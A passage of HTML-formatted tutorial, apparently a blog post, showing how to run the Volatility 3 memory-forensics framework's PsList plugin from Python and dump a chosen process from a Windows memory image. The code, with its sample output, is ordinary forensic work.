248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   plugin_config_path </span><span class="token operator">=</span><span class="token plain"> interfaces</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">configuration</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">path_join</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">base_config_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> plugin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">__name__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   automagics </span><span class="token operator">=</span><span class="token plain"> automagic</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">choose_automagic</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">available_automagics</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> plugin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">config</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">'automagic.LayerStacker.stackers'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> automagic</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">stacker</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">choose_os_stackers</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">plugin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">config</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">'automagic.LayerStacker.single_location'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"file://"</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">getcwd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"/"</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> image_name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   constructed </span><span class="token operator">=</span><span class="token plain"> construct_plugin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> automagics</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> plugin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> base_config_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> constructed</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ctx </span><span class="token operator">=</span><span class="token plain"> contexts</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">Context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">  </span><span class="token comment" style="color:rgb(98, 114, 164)">## Construct a blank context</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">failures </span><span class="token operator">=</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">import_files</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">plugins</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)">##Load the framework plugins</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> failures</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"Some volatility3 plugin couldn't be loaded : </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">failures</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"Plugins are loaded without failure"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">plugin_list </span><span class="token operator">=</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">list_plugins</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">base_config_path </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"plugins"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">constructed </span><span class="token operator">=</span><span class="token plain"> build_context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Triage-Memory.mem"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> ctx</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> base_config_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> plugin_list</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">'windows.pslist.PsList'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> constructed</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   result </span><span class="token operator">=</span><span class="token plain"> text_renderer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">PrettyTextRenderer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">render</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">constructed</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">run</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>OUTPUT :</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO:__main__:Plugins are loaded without failure</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO:volatility3.framework.automagic:Detected a windows category plugin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO:volatility3.framework.automagic:Running automagic: ConstructionMagic</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO:volatility3.framework.automagic:Running automagic: LayerStacker</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO:volatility3.framework.automagic:Running automagic: WinSwapLayers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO:volatility3.framework.automagic:Running automagic: KernelPDBScanner</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO:volatility3.framework.automagic:Running automagic: KernelModule</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Formatting...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> |  PID | PPID |  ImageFileName |      Offset(V) | Threads | Handles | SessionId | Wow64 |                  CreateTime | ExitTime | File output</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* |    4 |    0 |         System | 0xfa8003c72b30 |      87 |     547 |       N/A | False | 2019-03-22 05:31:55.000000  |      N/A |    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* |  252 |    4 |       smss.exe | 0xfa8004616040 |       2 |      30 |       N/A | False | 2019-03-22 05:31:55.000000  |      N/A |    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* |  332 |  324 |      csrss.exe | 0xfa80050546b0 |      10 |     516 |         0 | False | 2019-03-22 05:31:58.000000  |      N/A |    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* |  372 |  364 |      csrss.exe | 0xfa800525a9e0 |      11 |     557 |         1 | False | 2019-03-22 05:31:58.000000  |      N/A |    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* |  380 |  324 |    wininit.exe | 0xfa8005259060 |       3 |      78 |         0 | False | 2019-03-22 05:31:58.000000  |      N/A |    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* |  416 |  364 |   winlogon.exe | 0xfa8005268b30 |       3 |     110 |         1 | False | 2019-03-22 05:31:58.000000  |      N/A |    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* |  476 |  380 |   services.exe | 0xfa8005680910 |      12 |     224 |         0 | False | 2019-03-22 05:31:59.000000  |      N/A |    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Going further</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Great, we now know how to run a simple plugin with no specfic configuration and a default text renderer. In this section, we'll try to dump a specific process using the capabilities of the PsList plugin.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">If you take a look at the context configuration displayed earlier, you'll notice that some options about the PsList plugin are set by default. What if we want to try to dump a specific process ? With the volatility3 CLI, the command is the following :</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">¬ª vol -f Triage-Memory.mem windows.pslist --pid 252 --dump                                                                                                                             k1nd0ne@MacBook-Pro-de-Felix</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Volatility 3 Framework 2.0.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Progress:  100.00		PDB scanning finished</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PID	PPID	ImageFileName	Offset(V)	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime	File output</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">252	4	smss.exe	0xfa8004616040	2	30	N/A	False	2019-03-22 05:31:55.000000 	N/A	pid.252.0x48430000.dmp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">The arguments we specified are the PID, which is the process ID we want to filter, and the DUMP option, which means that we want to dump the list of the filtered processes.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">If we take a look at the plugin context configuration, the entries reponsible are the following :</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">"plugins.PsList.pid": []</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">"plugins.PsList.dump": false In our code, we just have to clarify those two values:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ctx.config["plugins.PsList.pid"] = [252]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ctx.config["plugins.PsList.dump"] = True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">constructed = build_context("Triage-Memory.mem", ctx, base_config_path, plugin_list['windows.pslist.PsList'])</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>OUTPUT :</p>
<div class="language-1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-1 codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO:__main__:Plugins are loaded without failure</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO:volatility3.framework.automagic:Detected a windows category plugin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO:volatility3.framework.automagic:Running automagic: ConstructionMagic</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO:volatility3.framework.automagic:Running automagic: LayerStacker</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO:volatility3.framework.automagic:Running automagic: WinSwapLayers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO:volatility3.framework.automagic:Running automagic: KernelPDBScanner</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO:volatility3.framework.automagic:Running automagic: KernelModule</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Formatting...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| PID | PPID | ImageFileName |      Offset(V) | Threads | Handles | SessionId | Wow64 |                  CreateTime | ExitTime |            File output</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* | 252 |    4 |      smss.exe | 0xfa8004616040 |       2 |      30 |       N/A | False | 2019-03-22 05:31:55.000000  |      N/A | pid.252.0x48430000.dmp</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This code will be interpreted without error. However you'll never find your process on your drive ! Why ? Well, in the "build_context" function, I have called the volatility3 framework's "construct_plugin" function with no File Handler Interface. By default, the volatility3 framework lets you decide how to handle files by rewritting the methods (open, write, ...). In this example, we want the file to be directly written in the current directory from where the script is executed. The following code is using the CLIDirectFileHandler from the native framework with a little bit of tweaking. Once integrated into our code, the final result looks like this :</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> contexts</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> interfaces</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> volatility3 </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> plugins</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> automagic</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">plugins </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> construct_plugin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">cli </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> text_renderer</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> io</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> tempfile</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">file_handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">output_dir</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">class</span><span class="token plain"> </span><span class="token class-name">CLIFileHandler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">interfaces</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">plugins</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">FileHandlerInterface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">"""The FileHandler from Volatility3 CLI"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">_get_final_filename</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">"""Gets the final filename"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> output_dir </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">is</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">               </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">raise</span><span class="token plain"> TypeError</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Output directory is not a string"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">makedirs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">output_dir</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> exist_ok </span><span class="token operator">=</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           pref_name_array </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">preferred_filename</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">split</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'.'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           filename</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> extension </span><span class="token operator">=</span><span class="token plain"> os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">join</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">output_dir</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'.'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">join</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pref_name_array</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> pref_name_array</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           output_filename </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">filename</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">.</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">extension</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           counter </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">exists</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">output_filename</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">               os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">remove</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">output_filename</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> output_filename</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">class</span><span class="token plain"> </span><span class="token class-name">CLIDirectFileHandler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">CLIFileHandler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       </span><span class="token triple-quoted-string string" 